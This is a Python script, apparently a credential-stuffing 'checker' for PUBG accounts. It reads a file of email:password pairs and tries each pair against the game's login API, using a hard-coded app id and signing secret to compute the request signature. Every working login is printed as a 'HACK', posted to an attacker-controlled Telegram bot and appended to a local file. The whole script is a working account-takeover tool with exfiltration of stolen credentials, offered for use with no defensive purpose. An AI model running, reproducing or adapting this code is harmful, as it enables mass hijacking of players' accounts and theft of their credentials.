import requests,hashlib,random,string,time
r = requests.session()
print("""

  ____ _____        ___    _   _ _______  _______ 
 |  _ \_ _\ \      / / \  | \ | |_   _\ \/ /_   _|
 | | | | | \ \ /\ / / _ \ |  \| | | |  \  /  | |  
 | |_| | |  \ V  V / ___ \| |\  |_| |  /  \  | |  
 |____/___|  \_/\_/_/   \_\_| \_(_)_| /_/\_\ |_|  
________________
        Telegram: https://t.me/GiveWayLost
        Telegram: https://t.me/WEBFORKURD
        Auther1: @LO1STT > LOST
        Auther2: @uY_0_U > diwan

""")
ID= input('[+] ID telegramy xot  : ')
token = input('[+] TOKEN telegramy xot  : ')
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
[✓] SUCCESSFULL > PUBG :
HACK BY DIWAN
[✓] Email: {eml}
[✓] Pass: {pas}
━━━━━━━━━━━━━"""
  NO = f"""
[-]  CHECKPOINT > PUBG :
HACK NOT DIWAN
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @uY_0_U & @LO1STT')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |Give Way \n')
  else:
    print(NO)
def FILname():
  F = input('[+] Enter the name the combo file : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()
FILname()
